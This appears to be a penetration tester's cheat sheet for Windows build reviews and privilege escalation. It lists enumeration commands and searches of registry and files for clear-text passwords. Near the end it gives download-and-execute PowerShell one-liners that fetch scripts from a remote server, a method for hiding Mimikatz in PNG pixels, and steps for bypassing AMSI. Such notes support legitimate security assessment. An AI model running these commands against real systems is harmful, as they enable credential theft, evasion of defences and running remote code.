# Windows Build Review
## File System Configuration
    `systeminfo`
## Network Time Protocol
## Routing Table
## Start-up Executables
- C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
- C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
## Active Processes
`tasklist /svc`
## Active Network Connections
`netstat -ano`
## Local Services
`wmic service list brief`
`sc query`
`Get-Service | fl`
## Weak Service Permissions
`SharpUp.exe audit ModifiableServices`
`powershell-import C:\Tools\Get-ServiceAcl.ps1`
`powershell Get-ServiceAcl -Name VulnService2 | select -expand Access`
## Unquoted Service Paths
 - `wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """`
- `gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name`
- `powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl` Check Path
## Available Shares
## User Accounts Review
    `whoami`
    `whoami /group`
    `whoami /priv` # Look for SeBackupPriv, SeDebugPriv, SeTakeOwnershipPriv,SeTcbPrivilege, SeCreateToken Privilege, SeLoadDriver Privilege, SeImpersonate
    `net user`
    `net localgroup`
    `net user [name]`
    `net group /dom`
    `net group /domain [group]`
## Clear-Text Passwords
- `c:\sysprep.inf`
- `c:\sysprep\sysprep.xml`
- `c:\unattend.xml`
- `%WINDIR%\Panther\Unattend\Unattended.xml`
- `%WINDIR%\Panther\Unattended.xml`
- `reg query "HKCU\Software\ORL\WinVNC3\Password"`
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
- `reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`
- `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"`
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`
- `cmdkey /list`
- `dir C:\Users\username\AppData\Local\Microsoft\Credentials\`
- `dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\`
- `findstr /si password *.txt`
- `findstr /si password *.xml` 
- `findstr /si password *.ini
- `dir /s *pass* == *cred* == *vnc* == *.config*`
- `findstr /spin "password" *.*`
- `findstr /spin "password" *.*`
## Storage Mechanism of Password Hashes
## Account Lockout Policy
## Local Security Policy
## Events Auditing
## Host Based Firewall
    `netsh firewall show state`
    `netsh firewall show config`
## Antivirus Software Review
## Windows Patch Level
    `wmic qfe get Caption,Description,HotFixID,InstalledOn`
## Remote Management
## Installed Software
```
tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
## Tasks
- `schtasks /query /fo LIST /v`
- `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
## Always Elevated
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

## Apps
- winPeas
- Seatbelt `https://github.com/GhostPack/Seatbelt`
- PowerUp `https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1`
- SharpUp`https://github.com/GhostPack/SharpUp` - C# version of PowerUp
`powershell.exe /c IEX(New-Object Net.WebClient).downloadString('webserver/PowerUp.ps1') ;Invoke-AllChecks`
- Hardening Kitty
- Nessus Compliance



## Invoke-PSImage
```
#https://github.com/peewpw/Invoke-PSImage

Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute

Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.

PS>Import-Module .\Invoke-PSImage.ps1
PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg
   [Oneliner to execute from a file]
   
   
PS>Import-Module .\Invoke-PSImage.ps1
PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest
   [Oneliner to execute from the web]
```

### ASMI Bypass 
```

1. Open powershell, grab a unique AMSI bypass from: https://amsi.fail/

2. Grab your favourite C# assembly from: https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/ these are just the standard C# executables but in a powershell wrapper for reflection.

3. Host these locally and execute via IEX (New-Object net.webclient).downloadstring("http://x.x.x.x./Invoke-Seatbelt.ps1")
```
